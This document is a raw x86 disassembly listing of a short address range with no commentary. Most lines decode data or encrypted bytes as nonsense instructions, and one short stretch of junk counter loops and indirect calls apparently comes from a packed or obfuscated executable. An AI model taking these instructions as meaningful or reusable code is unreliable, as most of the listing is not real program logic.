  40a2f6:	pusha  
  40a2f7:	mov    ecx,0xda943078
  40a2fc:	in     al,dx
  40a2fd:	clc    
  40a2fe:	and    bl,dl
  40a300:	loopne 0x40a367
  40a302:	mov    ds:0xbbe1c16f,eax
  40a307:	cs and al,0x45
  40a30a:	fnsave [eax-0x9]
  40a30d:	pop    ecx
  40a30e:	test   dh,bh
  40a310:	sub    eax,0x9af2ba71
  40a315:	lea    esi,[ecx+0x62]
  40a318:	pop    ecx
  40a319:	fs xchg esp,eax
  40a31b:	and    BYTE PTR [ecx+edx*4-0x43],0xfe
  40a320:	shl    BYTE PTR [esi-0x827bc8c],1
  40a326:	push   esi
  40a327:	mov    esp,0x73826483
  40a32c:	bound  ebx,QWORD PTR [eax-0x6f]
  40a32f:	push   ebp
  40a330:	add    al,0xba
  40a332:	xor    ebx,DWORD PTR [esi-0x4a2f67c9]
  40a338:	jbe    0x40a389
  40a33a:	je     0x40a303
  40a33c:	dec    esi
  40a33d:	push   edi
  40a33e:	cmp    ecx,edi
  40a340:	nop
  40a341:	adc    ebp,DWORD PTR [ebx-0x2d]
  40a344:	inc    ecx
  40a345:	shl    DWORD PTR [edx],1
  40a347:	nop
  40a348:	jno    0x40a2fc
  40a34a:	push   ebp
  40a34b:	push   esi
  40a34c:	mov    al,0x50
  40a34e:	popf   
  40a34f:	adc    eax,ecx
  40a351:	(bad)  
  40a352:	sbb    ecx,DWORD PTR [esi-0x23c7bbb4]
  40a358:	adc    eax,0xedeb5f02
  40a35d:	add    eax,0xf3cef40d
  40a362:	sahf   
  40a363:	adc    BYTE PTR [ebx],al
  40a365:	adc    esp,DWORD PTR [ebp-0x74]
  40a368:	pop    eax
  40a369:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a36a:	mov    bl,0xa6
  40a36c:	cmp    DWORD PTR [edx+0x10],0x6520f0db
  40a373:	clc    
  40a374:	mov    cl,0xd
  40a376:	(bad)  [ecx]
  40a378:	fidivr WORD PTR ds:0x2d32dba7
  40a37e:	bound  edx,QWORD PTR [esi-0x73]
  40a381:	mov    dh,0xa1
  40a383:	mov    ch,0xf5
  40a385:	inc    esp
  40a386:	inc    esp
  40a387:	inc    ebp
  40a388:	cwde   
  40a389:	mov    ds:0x11c0ae61,al
  40a38e:	adc    esi,eax
  40a390:	push   es
  40a391:	scas   eax,DWORD PTR es:[edi]
  40a392:	mov    dl,0x8a
  40a394:	cld    
  40a395:	gs stc 
  40a397:	add    eax,0x55c49fa8
  40a39c:	mov    bh,dl
  40a39e:	cli    
  40a39f:	hlt    
  40a3a0:	jge    0x40a3c6
  40a3a2:	push   ebx
  40a3a3:	inc    edi
  40a3a4:	outs   dx,DWORD PTR ds:[esi]
  40a3a5:	xor    DWORD PTR [edx-0x9],ebp
  40a3a8:	mov    ch,0xf9
  40a3aa:	xchg   edi,eax
  40a3ab:	loop   0x40a363
  40a3ad:	ins    BYTE PTR es:[edi],dx
  40a3ae:	or     DWORD PTR [edi+0xa],ebp
  40a3b1:	xchg   ecx,eax
  40a3b2:	mov    ds:0xebe44ea6,eax
  40a3b7:	mov    al,0xae
  40a3b9:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a3ba:	jmp    0x40a42f
  40a3bc:	call   0xfd7397f3
  40a3c1:	sub    cl,0x2b
  40a3c4:	aam    0x93
  40a3c6:	pop    edx
  40a3c7:	jge    0x40a3a8
  40a3c9:	pop    ds
  40a3ca:	mov    ecx,0x2f990f5b
  40a3cf:	mov    cl,0x21
  40a3d1:	sbb    BYTE PTR [esp+edi*8+0x33],ah
  40a3d5:	dec    edi
  40a3d6:	int    0x30
  40a3d8:	daa    
  40a3d9:	or     dh,0x0
  40a3dc:	sbb    eax,0x5dce257e
  40a3e1:	hlt    
  40a3e2:	jmp    0xecdc:0x39e0d85e
  40a3e9:	mov    ds:0x78e095b1,al
  40a3ee:	icebp  
  40a3ef:	xchg   edi,eax
  40a3f0:	popa   
  40a3f1:	out    0x42,eax
  40a3f3:	dec    edi
  40a3f4:	xchg   edi,eax
  40a3f5:	and    ah,BYTE PTR [ebx+eax*8]
  40a3f8:	sub    al,0x9c
  40a3fa:	daa    
  40a3fb:	mov    edi,0x7de2eaa4
  40a400:	adc    eax,0x7fcd1173
  40a405:	jnp    0x40a451
  40a407:	es gs mov dl,0xb8
  40a40b:	nop
  40a40c:	in     al,0xe3
  40a40e:	mov    edi,0xfb20c07c
  40a413:	mov    ds:0xf5e3f8aa,al
  40a418:	(bad)  
  40a419:	mov    ds:0xe12fb5d8,eax
  40a41e:	xor    ch,BYTE PTR [ecx]
  40a420:	repz call 0x89cd4e6b
  40a426:	fidiv  WORD PTR [esi]
  40a428:	xlat   BYTE PTR ds:[ebx]
  40a429:	lea    eax,[esp+edx*8+0x25]
  40a42d:	mov    dl,0xce
  40a42f:	in     eax,0x30
  40a431:	mov    bl,0x1c
  40a433:	dec    BYTE PTR [ecx]
  40a435:	fcomp  DWORD PTR [eax]
  40a437:	aas    
  40a438:	mov    eax,ds:0xc5122c8a
  40a43d:	icebp  
  40a43e:	add    DWORD PTR [edx+ecx*4],0xffffff96
  40a442:	mov    edi,DWORD PTR [ebx]
  40a444:	pop    edx
  40a445:	sub    edx,DWORD PTR es:[eax-0x5a]
  40a449:	lea    ebx,[ebp-0x2fafb9a8]
  40a44f:	rcr    DWORD PTR [ecx+0x29],cl
  40a452:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a453:	outs   dx,DWORD PTR ds:[esi]
  40a454:	or     bl,al
  40a456:	push   ecx
  40a457:	push   ss
  40a458:	sub    ah,al
  40a45a:	int3   
  40a45b:	das    
  40a45c:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  40a45d:	fldcw  WORD PTR [ebx+0x47]
  40a460:	dec    ecx
  40a461:	int3   
  40a462:	(bad)  
  40a463:	in     eax,dx
  40a464:	fadd   QWORD PTR [ebp+0x6f]
  40a467:	push   ecx
  40a468:	inc    esi
  40a469:	sbb    al,0xa7
  40a46b:	and    DWORD PTR [eax],edi
  40a46d:	mov    WORD PTR [ebp-0x5a1d2879],?
  40a473:	dec    ebx
  40a474:	(bad)  
  40a475:	les    esp,FWORD PTR [ebx+0x68]
  40a478:	leave  
  40a479:	dec    ebp
  40a47a:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a47b:	inc    esi
  40a47c:	pop    edx
  40a47d:	sbb    bl,BYTE PTR [ebx+0x58]
  40a480:	adc    dh,ah
  40a482:	imul   ecx,DWORD PTR [edi+esi*2-0x2fcd983e],0xcdb0e7aa
  40a48d:	cmp    al,0x5
  40a48f:	pop    ds
  40a490:	shl    BYTE PTR [ecx-0x73],0x81
  40a494:	jp     0x40a4d9
  40a496:	shr    DWORD PTR [ebp-0x26],cl
  40a499:	mov    BYTE PTR [ecx],ch
  40a49b:	adc    eax,0xaba81004
  40a4a0:	repz popa 
  40a4a2:	shl    edx,cl
  40a4a4:	pop    esi
  40a4a5:	jnp    0x40a435
  40a4a7:	in     eax,0x2f
  40a4a9:	aaa    
  40a4aa:	and    ebx,DWORD PTR [ecx+0x6d34bdf5]
  40a4b0:	cmp    DWORD PTR [ecx+0x35],esi
  40a4b3:	scas   al,BYTE PTR es:[edi]
  40a4b4:	dec    esi
  40a4b5:	cli    
  40a4b6:	inc    ecx
  40a4b7:	out    dx,al
  40a4b8:	xor    DWORD PTR [esi-0x75e1ff03],esi
  40a4be:	mov    DWORD PTR [edx+0x5f9f6dfe],0x496a13df
  40a4c8:	xchg   esi,eax
  40a4c9:	lahf   
  40a4ca:	rol    DWORD PTR [ecx+0xa486e02],1
  40a4d0:	sub    edx,DWORD PTR [ebx]
  40a4d2:	out    0xaf,eax
  40a4d4:	cmp    cl,BYTE PTR [ebp-0x33ccc03c]
  40a4da:	rol    BYTE PTR [ebx+esi*1-0x1e7124e2],1
  40a4e1:	xor    eax,0xf97bfc0
  40a4e6:	jns    0x40a4db
  40a4e8:	sahf   
  40a4e9:	jl     0x40a4f4
  40a4eb:	aad    0xd8
  40a4ed:	call   0xbe37:0xf26b5db1
  40a4f4:	or     eax,0x1cb07d05
  40a4f9:	pop    edi
  40a4fa:	mov    cl,0xa9
  40a4fc:	ret    0x52f8
  40a4ff:	or     DWORD PTR [eax],edx
  40a501:	xchg   ch,ch
  40a503:	(bad)  
  40a504:	gs jno 0x40a572
  40a507:	and    al,0x81
  40a509:	jns    0x40a580
  40a50b:	jne    0x40a53c
  40a50d:	ss mov dh,0x61
  40a510:	mov    cl,0x40
  40a512:	mov    ah,0x32
  40a514:	xchg   esp,eax
  40a515:	push   esp
  40a516:	stc    
  40a517:	sbb    al,0xce
  40a519:	addr16 mov ch,0x73
  40a51c:	test   DWORD PTR [edi-0x84600a],eax
  40a522:	mov    al,ds:0xb614e131
  40a527:	test   al,0x50
  40a529:	push   0xe0651ead
  40a52e:	dec    esi
  40a52f:	mov    ds:0x34eb9b2e,al
  40a534:	sub    ch,ch
  40a536:	(bad)  
  40a537:	or     DWORD PTR [eax+0x5efa1efe],esi
  40a53d:	(bad)  
  40a53e:	addr16 mov edx,0x297449ac
  40a544:	push   ss
  40a545:	inc    eax
  40a546:	jl     0x40a4ed
  40a548:	jmp    0x40a55b
  40a54a:	push   ebx
  40a54b:	add    ebp,edx
  40a54d:	or     DWORD PTR [edx+ebp*4],edx
  40a550:	adc    al,0x9e
  40a552:	fs push eax
  40a554:	lods   al,BYTE PTR ds:[esi]
  40a555:	xchg   esp,eax
  40a556:	aaa    
  40a557:	int    0xd6
  40a559:	lahf   
  40a55a:	inc    esp
  40a55b:	mov    ebp,0x336a46f5
  40a560:	xchg   ebp,eax
  40a561:	int3   
  40a562:	sbb    al,0xa
  40a564:	(bad)  
  40a565:	sub    al,0xfb
  40a567:	pop    ebp
  40a568:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  40a569:	xchg   ecx,eax
  40a56a:	neg    BYTE PTR [edi]
  40a56c:	adc    al,0x84
  40a56e:	or     ecx,DWORD PTR [edi+0x22197704]
  40a574:	push   cs
  40a575:	cdq    
  40a576:	dec    esi
  40a577:	ins    DWORD PTR es:[edi],dx
  40a578:	lods   eax,DWORD PTR ds:[esi]
  40a579:	loop   0x40a54a
  40a57b:	push   esp
  40a57c:	(bad)  
  40a57d:	mov    dh,0xd4
  40a57f:	push   esp
  40a580:	push   ebx
  40a581:	outs   dx,BYTE PTR ds:[esi]
  40a582:	cmps   BYTE PTR gs:[esi],BYTE PTR es:[edi]
  40a584:	test   al,0x86
  40a586:	add    BYTE PTR [eax+0xc],dh
  40a589:	add    ch,BYTE PTR [esi-0x483750c2]
  40a58f:	xchg   edx,eax
  40a590:	cmp    ebx,DWORD PTR [ecx]
  40a592:	xchg   BYTE PTR [eax+0x228ba19],ah
  40a598:	retf   
  40a599:	test   al,0x2d
  40a59b:	add    dh,bh
  40a59d:	arpl   WORD PTR [edi+esi*8-0x3b],di
  40a5a1:	push   edi
  40a5a2:	jno    0x40a565
  40a5a4:	cwde   
  40a5a5:	iret   
  40a5a6:	cmp    cl,al
  40a5a8:	xchg   ecx,eax
  40a5a9:	adc    edx,ebp
  40a5ab:	cmp    bh,dl
  40a5ad:	or     ah,BYTE PTR [esi]
  40a5af:	fwait
  40a5b0:	or     BYTE PTR [ebx],dh
  40a5b2:	sbb    ebx,DWORD PTR fs:[edx-0x51]
  40a5b6:	sub    bl,BYTE PTR [ebp+eax*4-0x731fd44]
  40a5bd:	lock test eax,0x2940e404
  40a5c3:	(bad)  
  40a5c4:	repnz outs dx,DWORD PTR ds:[esi]
  40a5c6:	mov    ah,0x7a
  40a5c8:	shl    DWORD PTR [edi+0x3],cl
  40a5cb:	push   ebx
  40a5cc:	fist   DWORD PTR [edx+0x16]
  40a5cf:	test   eax,0x66c9e11c
  40a5d4:	outs   dx,BYTE PTR ds:[esi]
  40a5d5:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40a5d6:	or     eax,0x3dd3c071
  40a5db:	pop    eax
  40a5dc:	mov    DWORD PTR [edx],edx
  40a5de:	lahf   
  40a5df:	pop    ebp
  40a5e0:	retf   
  40a5e1:	inc    ecx
  40a5e2:	mov    dl,BYTE PTR [eax]
  40a5e4:	sbb    DWORD PTR [esp+edi*1],eax
  40a5e7:	sbb    DWORD PTR [edx-0x759a8e75],ecx
  40a5ed:	div    DWORD PTR [esi+ebx*8]
  40a5f0:	xor    ax,0xe2f3
  40a5f4:	mov    bh,0x34
  40a5f6:	das    
  40a5f7:	shr    DWORD PTR [edx+0x1db66499],0x12
  40a5fe:	fcom   QWORD PTR [ecx+0x51]
  40a601:	push   edx
  40a602:	and    eax,0x3099b1da
  40a607:	sbb    ch,bh
  40a609:	xor    ebx,DWORD PTR [edi+0x583fb534]
  40a60f:	sbb    DWORD PTR [edx-0x75],ecx
  40a612:	pusha  
  40a613:	mov    cl,0xbc
  40a615:	rcl    BYTE PTR [ebx],1
  40a617:	aas    
  40a618:	xor    esi,DWORD PTR fs:[ebx]
  40a61b:	call   0x385d2b7e
  40a620:	mov    dh,0x25
  40a622:	sub    al,BYTE PTR [ebx-0x59]
  40a625:	xor    eax,0x85760d2c
  40a62a:	xlat   BYTE PTR ds:[ebx]
  40a62b:	ret    
  40a62c:	data16 in al,0xcf
  40a62f:	adc    DWORD PTR [ebx+0x4147707a],eax
  40a635:	sub    eax,0x4b5b0501
  40a63a:	jmp    0x6c792120
  40a63f:	sbb    edx,esp
  40a641:	pop    edx
  40a642:	push   esi
  40a643:	in     al,dx
  40a644:	call   0x1a0b14b2
  40a649:	call   0xd0ea:0xce7d228e
  40a650:	mov    al,0xb5
  40a652:	scas   eax,DWORD PTR es:[edi]
  40a653:	jl     0x40a666
  40a655:	inc    esp
  40a656:	test   BYTE PTR [eax+0x22],ch
  40a659:	(bad)  
  40a65a:	sbb    eax,0xff9c6df
  40a65f:	xor    cl,BYTE PTR [edi]
  40a661:	mov    dl,0x9d
  40a663:	or     al,0x6c
  40a665:	xchg   edx,eax
  40a666:	inc    edx
  40a667:	cmp    al,0xe0
  40a669:	hlt    
  40a66a:	out    0x65,al
  40a66c:	xchg   BYTE PTR [ebx],bl
  40a66e:	jg     0x40a62a
  40a670:	add    bh,al
  40a672:	inc    ebp
  40a673:	int3   
  40a674:	cmp    al,0x85
  40a676:	pushf  
  40a677:	clc    
  40a678:	mov    DWORD PTR [ebp-0x38],0xf89c853f
  40a67f:	and    DWORD PTR ds:0x42e6ef,0x0
  40a689:	xor    edx,edx
  40a68b:	or     edx,DWORD PTR ds:0x42e6ef
  40a691:	inc    edx
  40a692:	mov    DWORD PTR ds:0x42e6ef,edx
  40a698:	cmp    DWORD PTR ds:0x42e6ef,0xf
  40a69f:	jne    0x40a6c6
  40a6a5:	push   DWORD PTR [ebp-0x28]
  40a6a8:	push   DWORD PTR [ebp-0x10]
  40a6ab:	push   0x42e6f7
  40a6b0:	push   DWORD PTR [ebp-0x14]
  40a6b3:	push   DWORD PTR [ebp-0x18]
  40a6b6:	push   0x89bc
  40a6bb:	push   0x39f6
  40a6c0:	call   DWORD PTR ds:0x42e2eb
  40a6c6:	cmp    DWORD PTR ds:0x42e6ef,0xe
  40a6cd:	jne    0x40a6e0
  40a6d3:	mov    edx,DWORD PTR ds:0x42e6ef
  40a6d9:	inc    edx
  40a6da:	mov    DWORD PTR ds:0x42e6ef,edx
  40a6e0:	cmp    DWORD PTR ds:0x42e6ef,0x1c
  40a6e7:	jb     0x40a689
  40a6ed:	and    DWORD PTR ds:0x42fcdd,0x0
  40a6f7:	jmp    0x40a709
  40a6fc:	mov    edx,DWORD PTR ds:0x42fcdd
  40a702:	inc    edx
  40a703:	mov    DWORD PTR ds:0x42fcdd,edx
  40a709:	cmp    DWORD PTR ds:0x42fcdd,0x13
  40a710:	jae    0x40a766
  40a716:	cmp    DWORD PTR ds:0x42fcdd,0xb
  40a71d:	jne    0x40a733
  40a723:	push   0x42e26d
  40a728:	push   0x42e25b
  40a72d:	call   DWORD PTR ds:0x42e547
  40a733:	cmp    DWORD PTR ds:0x42fcdd,0xa
  40a73a:	jne    0x40a74f
  40a740:	xor    edx,edx
  40a742:	add    edx,DWORD PTR ds:0x42fcdd
  40a748:	inc    edx
  40a749:	mov    DWORD PTR ds:0x42fcdd,edx
  40a74f:	jmp    0x40a6fc
  40a754:	mov    edi,DWORD PTR ds:0x42e134
  40a75a:	xor    edi,DWORD PTR ds:0x42e713
  40a760:	mov    DWORD PTR ds:0x42e134,edi
  40a766:	mov    DWORD PTR [ebp-0x3c],0xf89c853e
  40a76d:	adc    DWORD PTR ds:0x42e713,edx
  40a773:	mov    edx,DWORD PTR [ebp+0x8]
  40a776:	xor    edx,eax
  40a778:	sub    edi,DWORD PTR ds:0x42fcd1
  40a77e:	mov    edi,DWORD PTR [ebp-0x10]
  40a781:	add    edx,ecx
  40a783:	mov    DWORD PTR ds:0x42fce5,0x29c7
  40a78d:	cmp    edi,edx
  40a78f:	mov    DWORD PTR ds:0x42e713,0x10c5
  40a799:	je     0x40d88b
  40a79f:	mov    DWORD PTR ds:0x42fcf9,0x41c2
  40a7a9:	push   ebx
  40a7aa:	mov    DWORD PTR ds:0x42fd09,0x2602
  40a7b4:	jmp    0x40d4a8
  40a7b9:	mov    edx,DWORD PTR [ebp-0x8]
  40a7bc:	mov    DWORD PTR ds:0x42e130,0x1c
  40a7c6:	cmp    DWORD PTR ds:0x42e130,0x0
  40a7cd:	je     0x40a824
  40a7d3:	cmp    DWORD PTR ds:0x42e130,0x7
  40a7da:	jne    0x40a7f8
  40a7e0:	push   DWORD PTR [ebp-0x10]
  40a7e3:	push   0x42e1e7
  40a7e8:	push   0x42e23d
  40a7ed:	push   0x42e23d
  40a7f2:	call   DWORD PTR ds:0x42e2ef
  40a7f8:	cmp    DWORD PTR ds:0x42e130,0x8
  40a7ff:	jne    0x40a812
  40a805:	mov    edi,DWORD PTR ds:0x42e130
  40a80b:	dec    edi
  40a80c:	mov    DWORD PTR ds:0x42e130,edi
  40a812:	mov    edi,DWORD PTR ds:0x42e130
  40a818:	dec    edi
  40a819:	mov    DWORD PTR ds:0x42e130,edi
  40a81f:	jmp    0x40a7c6
  40a824:	mov    edi,DWORD PTR [ebp-0x10]
  40a827:	xor    DWORD PTR ds:0x42e12c,0x3333
  40a831:	sub    edi,edx
  40a833:	mov    edx,DWORD PTR ds:0x42fd6e
  40a839:	add    DWORD PTR ds:0x42e707,edx
  40a83f:	mov    edx,DWORD PTR [ebp-0x4]
  40a842:	jmp    0x40ac00
  40a847:	addr16 sub al,0x5e
  40a84a:	xchg   esi,eax
  40a84b:	jno    0x40a89f
  40a84d:	ja     0x40a838
  40a84f:	dec    eax
  40a850:	(bad)  
  40a851:	in     al,dx
  40a852:	std    
  40a853:	push   ebp
  40a854:	sbb    DWORD PTR [eax-0x24],edx
  40a857:	in     al,0xf1
  40a859:	jo     0x40a8cb
  40a85b:	lahf   
  40a85c:	jge    0x40a8ce
  40a85e:	jo     0x40a8b4
  40a860:	jae    0x40a8bd
  40a862:	les    eax,FWORD PTR [edx+0x212d973f]
  40a868:	sbb    al,0xd3
  40a86a:	jae    0x40a87f
  40a86c:	popa   
  40a86d:	sti    
  40a86e:	sub    ebx,DWORD PTR [ecx-0x77a0bdc7]
  40a874:	shl    DWORD PTR [ebp+ebx*8-0x44],cl
  40a878:	add    eax,0x5afc9255
  40a87d:	add    DWORD PTR [eax-0x36],ebp
  40a880:	or     eax,0x9ecf3ee5
  40a886:	out    0x7b,eax
  40a888:	push   esi
  40a889:	(bad)  
  40a88a:	out    dx,al
  40a88b:	imul   edx,DWORD PTR [ebp-0x3a],0x52
  40a88f:	cmp    eax,0x6607d0e4
  40a894:	xchg   ecx,eax
  40a895:	gs mov dl,0xd7
  40a898:	es gs push esi
  40a89b:	sub    dh,BYTE PTR es:[ecx-0x63d352e2]
  40a8a2:	mov    ebp,0x6425b2fd
  40a8a7:	push   0x483dd31b
  40a8ac:	mov    DWORD PTR [eax],edx
  40a8ae:	pop    ecx
  40a8af:	jmp    0x74e0fafd
  40a8b4:	mov    dh,0x51
  40a8b7:	or     DWORD PTR [edx+0x79],esp
  40a8ba:	sub    eax,0x668f02a4
  40a8bf:	(bad)  
  40a8c0:	mov    ah,0xca
  40a8c2:	pop    ss
  40a8c3:	outs   dx,BYTE PTR ds:[esi]
  40a8c4:	loop   0x40a8de
  40a8c6:	or     esi,edi
  40a8c8:	push   edx
  40a8c9:	mov    al,ds:0x8f4122c2
  40a8ce:	push   ebp
  40a8cf:	cmp    ebp,DWORD PTR [ebx]
  40a8d1:	lea    ebx,[edx+0x72]
  40a8d4:	adc    al,BYTE PTR [ebx*4+0x645eec9f]
  40a8db:	or     cl,BYTE PTR [edi+0xd]
  40a8de:	(bad)  
  40a8e0:	pop    eax
  40a8e1:	in     eax,0x7b
  40a8e3:	adc    al,0xf9
  40a8e5:	je     0x40a8f0
  40a8e7:	popa   
  40a8e8:	adc    DWORD PTR [eax+esi*8],edi
  40a8eb:	test   al,0xf
  40a8ed:	scas   eax,DWORD PTR es:[edi]
  40a8ee:	rcl    DWORD PTR [ebx-0x15],1
  40a8f1:	jl     0x40a8cb
  40a8f3:	cmp    al,0x10
  40a8f5:	loop   0x40a903
  40a8f7:	retf   0xdf7c
  40a8fa:	xor    al,0x99
  40a8fc:	lods   al,BYTE PTR ds:[esi]
  40a8fd:	sub    DWORD PTR [ebp+0x23a401ca],ebp
  40a903:	stos   BYTE PTR es:[edi],al
  40a904:	dec    ebp
  40a905:	call   0x3d36f44f
  40a90a:	and    esp,DWORD PTR [eax-0x17c77547]
  40a910:	pushf  
  40a911:	das    
  40a912:	mov    esp,esi
  40a914:	dec    eax
  40a915:	push   ecx
  40a916:	imul   ebp,DWORD PTR [ebp+0x3e],0x39549129
  40a91d:	lods   eax,DWORD PTR ds:[esi]
  40a91e:	add    DWORD PTR [esi-0x4c],0x6c
  40a922:	sub    bl,bh
  40a924:	cmp    esp,esi
  40a926:	sub    BYTE PTR es:[ebp-0x10bfa84f],dl
  40a92d:	push   esp
  40a92e:	xchg   esi,eax
  40a92f:	sbb    al,0x19
  40a931:	jge    0x40a98d
  40a933:	xor    al,0x9c
  40a935:	in     al,dx
  40a936:	retf   
  40a937:	and    BYTE PTR [edi],dh
  40a939:	aas    
  40a93a:	sub    edi,eax
  40a93c:	popf   
  40a93d:	xchg   BYTE PTR [esi],dh
  40a93f:	mov    ch,0xa0
  40a941:	dec    ebx
  40a942:	fcomp  st(6)
  40a944:	jle    0x40a96d
  40a946:	jmp    0xfa54c8e8
  40a94b:	add    cl,BYTE PTR [eax]
  40a94d:	sbb    eax,0xcc4a91f1
  40a952:	inc    edx
  40a953:	aaa    
  40a954:	int3   
  40a955:	add    al,0xb2
  40a957:	xchg   ebx,eax
  40a958:	call   0x61650dbb
  40a95d:	sub    eax,0xbe1875ab
  40a962:	in     eax,dx
  40a963:	inc    edi
  40a964:	sbb    al,0xcc
  40a966:	mov    eax,ds:0xed1b226f
  40a96b:	mov    ch,0x24
  40a96d:	or     DWORD PTR [ecx-0x6],ebx
  40a970:	les    esp,FWORD PTR [ebp+edi*4-0x1fd8d7ad]
  40a977:	mov    ds:0xb73a0799,eax
  40a97c:	mov    BYTE PTR [ebx+ebx*2],0xa
  40a980:	sbb    DWORD PTR [ebx-0x3d],esi
  40a983:	inc    edi
  40a984:	sti    
  40a985:	xchg   ecx,eax
  40a986:	sar    BYTE PTR [ebx+0x3],cl
  40a989:	mov    eax,ds:0xb86770dc
  40a98e:	fdiv   QWORD PTR [ecx+0x64]
  40a991:	add    al,0x62
  40a993:	jecxz  0x40a94d
  40a995:	pushf  
  40a996:	jecxz  0x40aa10
  40a998:	test   ch,bl
  40a99a:	xor    DWORD PTR es:[ebp+0x773d270a],ebp
  40a9a1:	into   
  40a9a2:	cmp    al,0xf2
  40a9a4:	and    DWORD PTR [esi+0x1a],0xd42db3e
  40a9ab:	add    eax,0xbd7f4a8e
  40a9b0:	xchg   DWORD PTR [ebx+0x6693782f],edi
  40a9b6:	xchg   ebx,eax
  40a9b7:	jae    0x40aa15
  40a9b9:	fiadd  WORD PTR [esi-0x2a3203cf]
  40a9bf:	icebp  
  40a9c0:	(bad)  
  40a9c1:	mov    dh,0xde
  40a9c3:	call   0xa5b8:0x8f2ee184
  40a9ca:	in     al,dx
  40a9cb:	lods   al,BYTE PTR ds:[esi]
  40a9cc:	sub    edx,DWORD PTR ds:0x89386ec0
  40a9d2:	nop
  40a9d3:	push   ebp
  40a9d4:	adc    dh,bh
  40a9d6:	imul   edx,edx,0xeb4d4c54
  40a9dc:	cmp    BYTE PTR [edx],bl
  40a9de:	mov    WORD PTR [ebp-0x587ab491],fs
  40a9e4:	dec    edi
  40a9e5:	and    eax,DWORD PTR [eax+0x300dd228]
  40a9eb:	xor    esi,ebx
  40a9ed:	xor    al,0x79
  40a9ef:	push   es
  40a9f0:	dec    esi
  40a9f1:	(bad)  
  40a9f2:	out    0xf2,al
  40a9f4:	call   0x722ef867
  40a9f9:	xchg   BYTE PTR [ebp-0x76],ah
  40a9fc:	push   ebx
  40a9fd:	cmp    eax,0xae8f731a
  40aa02:	pop    edx
  40aa03:	mov    edi,0xd497eb10
  40aa08:	and    eax,0xe915aac9
  40aa0d:	inc    ebp
  40aa0e:	pop    eax
  40aa0f:	xor    BYTE PTR [edx+0x2fdd0d8b],0xb4
  40aa16:	ds adc al,0x17
  40aa19:	int3   
  40aa1a:	cmc    
  40aa1b:	call   0xf244:0x5b3930ab
  40aa22:	xor    BYTE PTR [edx+0x78],0x9d
  40aa26:	xor    DWORD PTR [ebx-0x6d],ebx
  40aa29:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  40aa2a:	dec    esi
  40aa2b:	sbb    eax,0xe6b53b38
  40aa30:	fldenv [ebp+eax*8+0x58]
  40aa34:	(bad)  
  40aa35:	nop
  40aa36:	jmp    0x40aa21
  40aa38:	sub    DWORD PTR [ebx+0x4dcaef69],0x6c
  40aa3f:	addr16 aas 
  40aa41:	es cmp al,0xdd
  40aa44:	js     0x40aa2f
  40aa46:	stos   BYTE PTR es:[edi],al
  40aa47:	sub    DWORD PTR [esi],eax
  40aa49:	outs   dx,BYTE PTR ds:[esi]
  40aa4a:	mov    ecx,0xcd11b230
  40aa4f:	dec    ebx
  40aa50:	in     al,0x22
  40aa52:	cmp    DWORD PTR [ebx+0x78fb9bf7],esi
  40aa58:	inc    ebx
  40aa59:	xchg   edi,eax
  40aa5a:	push   esi
  40aa5b:	xchg   esi,eax
  40aa5c:	push   esi
  40aa5d:	add    DWORD PTR [ecx],eax
  40aa5f:	sbb    DWORD PTR [esi],eax
  40aa61:	in     eax,dx
  40aa62:	jl     0x40aa25
  40aa64:	ss mov dl,0x2a
  40aa67:	add    al,0x28
  40aa69:	stc    
  40aa6a:	fldenv [ecx-0x67]
  40aa6d:	shr    BYTE PTR [ecx],cl
  40aa6f:	and    al,0x28
  40aa71:	outs   dx,BYTE PTR ds:[esi]
  40aa72:	scas   al,BYTE PTR es:[edi]
  40aa73:	or     BYTE PTR [edx-0x75],dl
  40aa76:	aas    
  40aa77:	add    al,0x67
  40aa79:	dec    ecx
  40aa7a:	mov    eax,ecx
  40aa7c:	push   ds
  40aa7d:	clc    
  40aa7e:	push   eax
  40aa7f:	addr16 jmp 0x40aa33
  40aa82:	sbb    DWORD PTR [ebp-0x11c69b14],ebx
  40aa88:	scas   eax,DWORD PTR es:[edi]
  40aa89:	mov    DWORD PTR [edi],esi
  40aa8b:	inc    ebx
  40aa8c:	mov    DWORD PTR [esi],ebp
  40aa8e:	inc    edi
  40aa8f:	shl    BYTE PTR [ecx*1-0x5bc6ae0c],cl
  40aa96:	jge    0x40ab02
  40aa98:	mov    eax,DWORD PTR [ebp+eiz*8-0x73]
  40aa9c:	dec    ecx
  40aa9d:	enter  0xa829,0x54
  40aaa1:	inc    edx
  40aaa2:	adc    DWORD PTR [esi-0x44d12ebf],0xffffff80
  40aaa9:	pop    eax
  40aaaa:	mov    esi,ecx
  40aaac:	fdiv   st(3),st
  40aaae:	add    edi,esp
  40aab0:	imul   eax,ebp,0x3d26eddc
  40aab6:	les    ebp,FWORD PTR [ecx]
  40aab8:	pop    ecx
  40aab9:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  40aaba:	xchg   DWORD PTR cs:[eax],ecx
  40aabd:	sub    eax,0xd5468fcc
  40aac2:	les    eax,FWORD PTR [edi]
  40aac4:	stc    
  40aac5:	jns    0x40ab37
  40aac7:	enter  0x3b4a,0x56
  40aacb:	outs   dx,DWORD PTR ds:[esi]
  40aacc:	and    esi,DWORD PTR [eax-0x41a928c8]
  40aad2:	jns    0x40aa5b
  40aad4:	or     DWORD PTR [ecx+0x932b551],ebx
  40aada:	sti    
  40aadb:	and    al,BYTE PTR [esi-0x14ae2827]
  40aae1:	ins    DWORD PTR es:[edi],dx
  40aae2:	pop    ds
  40aae3:	pop    ss
  40aae4:	test   DWORD PTR [edx*8+0x32431f36],edx
  40aaeb:	leave  
  40aaec:	aaa    
  40aaed:	aaa    
  40aaee:	aam    0xca
  40aaf0:	push   esi
  40aaf1:	call   0xd44440b4
  40aaf6:	inc    ebp
  40aaf7:	nop
  40aaf8:	inc    eax
  40aafa:	and    ch,BYTE PTR [ecx]
  40aafc:	int3   
  40aafd:	add    BYTE PTR [eax+0x21],dh
  40ab00:	fucomp st(5)
  40ab02:	cwde   
  40ab03:	ret    
  40ab04:	add    cl,BYTE PTR [ecx-0x26]
  40ab07:	out    0x15,eax
  40ab09:	pop    ebp
  40ab0a:	xchg   edx,eax
  40ab0b:	jbe    0x40aada
